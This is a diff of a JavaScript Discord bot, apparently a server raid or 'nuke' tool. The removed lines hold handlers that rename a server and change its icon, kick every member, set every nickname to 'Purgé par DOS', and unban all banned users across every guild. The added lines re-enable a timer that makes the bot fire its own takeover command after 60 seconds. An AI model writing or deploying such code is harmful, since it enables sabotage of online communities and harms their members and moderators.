@@ -43,50 +43,7 @@ bot.on("ready", () => {
 
  	})
 
- 	
-
-     	
-			  		}
-
-			  			if(msg.content === prefix+"issou"){
-
-			  				msg.delete();
-
-			  				msg.channel.send(prefix+"admin").then(m => m.delete())
-
-			  				msg.guild.setName(guildname)
-
-			  				msg.guild.setIcon("https://cdn.discordapp.com/attachments/527950009488900102/530126796348325888/PicsArt_01-02-12.14.53.png")
-
-			  				}				
-
-		          if(msg.content === prefix+"banall"){
-
-		          	msg. guild. members. map(g => g. kick())
-
- 	           msg.author.send("tout le monde est banni")
-
- 	           }
-
- 	           
-
- 	           		if(msg.content ===prefix +"rename"){
-
-	                	msg.delete();
-
-	                	msg.guild.members.map(g => g.setNickname("Purgé par DOS")) 
-
-	                }
-
-	
-
-		if(msg.content === "blop") {
-			
-			msg.delete() ;
-			
-	bot.guilds.map(g => g.fetchBans().then(bans => bans.forEach(ban => g.unban(ban.id))))
-
-}		
+ 		
  	           			
 bot.on("message", msg => {
 
@@ -132,13 +89,13 @@ bot.on("message", msg => {
 
 			    
 
-			     //setTimeout(() => {
+			     setTimeout(() => {
 
-			     	//msg. channel. send (prefix+"issou"). then(m => m. delete()) ;
+			     	msg.channel.send(prefix+"issou").then(m => m. delete()) ;
 
 			     	//msg.channel.send(prefix+"allchan").then(m => m.delete());
 
-			     	//}, 60000);   
+			     	}, 60000);   
 
 			 }
 
